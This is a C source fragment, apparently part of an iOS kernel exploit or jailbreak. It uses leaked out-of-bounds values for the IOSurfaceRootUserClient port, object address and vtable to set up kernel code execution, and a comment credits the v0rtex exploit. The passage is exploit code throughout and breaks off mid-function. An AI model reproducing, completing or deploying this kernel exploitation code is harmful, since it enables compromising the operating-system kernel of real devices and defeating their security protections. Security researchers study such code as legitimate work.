...
void init_Kernel_Execute(void) {
    UserClient = newClientSP_s31;//PrepareUserClient();
    printf("newClientSP_s3 = 0x%llx\n",newClientSP_s31 );
    printf("iosruc_port_OOB = 0x%llx\n",iosruc_port_OOB1 );
    printf("iosruc_addr_OOB = 0x%llx\n", iosruc_addr_OOB1);
    printf("iosruc_vtab_OOB = 0x%llx\n", iosruc_vtab_OOB1);
    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    IOSurfaceRootUserClient_Port = iosruc_port_OOB1;//find_port_address(UserClient, MACH_MSG_TYPE_COPY_SEND); // UserClients are just mach_ports, so we find its address
    //
    //printf("Found port: 0x%llx\n", IOSurfaceRootUserClient_Port);
    
    IOSurfaceRootUserClient_Addr = iosruc_addr_OOB1;//ReadKernel64(IOSurfaceRootUserClient_Port + off_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
    //
    //printf("Found addr: 0x%llx\n", IOSurfaceRootUserClient_Addr);
    
    uint64_t IOSurfaceRootUserClient_vtab = iosruc_vtab_OOB1;//ReadKernel64(IOSurfaceRootUserClient_Addr); // vtables in C++ are at *object
    //
